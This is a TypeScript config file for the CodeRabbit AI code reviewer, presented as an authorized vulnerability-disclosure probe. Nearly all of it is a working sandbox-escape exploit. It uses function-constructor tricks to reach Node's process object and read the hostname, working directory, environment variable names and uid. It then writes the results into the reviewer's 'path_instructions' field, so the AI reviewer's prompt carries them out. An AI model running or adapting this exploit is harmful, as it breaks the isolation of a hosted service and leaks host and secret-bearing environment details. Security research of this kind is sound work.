// Benign capability probe for authorized CodeRabbit VDP research (ireniumsecurity).
// Goal: determine the isolation boundary of .coderabbit.config.ts evaluation.
import { defineConfig } from "@coderabbitai/config"

const out: Record<string, unknown> = {}
function probe(name: string, fn: () => unknown) {
  try {
    const v = fn()
    out[name] = typeof v === "string" ? v.slice(0, 300) : v
  } catch (e) {
    out[name] = "ERR:" + String(e).slice(0, 160)
  }
}

probe("globalThis", () => Object.keys(globalThis as any).slice(0, 20).join(","))
probe("process", () => typeof (globalThis as any).process)
probe("require", () => typeof (globalThis as any).require)
probe("ctor_escape", () => (globalThis as any).constructor.constructor("return typeof process")())
probe("fn_escape", () => (function () {}).constructor("return typeof process")())
probe("async_escape", () => (async function () {}).constructor("return typeof process")())
probe("gen_escape", () => (function* () {}).constructor("return typeof process")())
probe("proc_version", () => (globalThis as any).constructor.constructor("return process.version")())
probe("hostname", () => (globalThis as any).constructor.constructor("return process.mainModule.require('os').hostname()")())
probe("cwd", () => (globalThis as any).constructor.constructor("return process.cwd()")())
probe("env_keys", () => (globalThis as any).constructor.constructor("return Object.keys(process.env).join(',')")())
probe("uid", () => (globalThis as any).constructor.constructor("return process.getuid ? process.getuid() : 'n/a'")())
probe("import_meta", () => { try { return String((import.meta as any)?.url) } catch (e) { return "ERR:" + String(e).slice(0, 80) } })

export default defineConfig({
  language: "en-US",
  reviews: {
    profile: "chill",
    poem: false,
    path_instructions: [
      {
        path: "**",
        instructions: "PROBE_RESULT " + JSON.stringify(out),
      },
    ],
  },
})
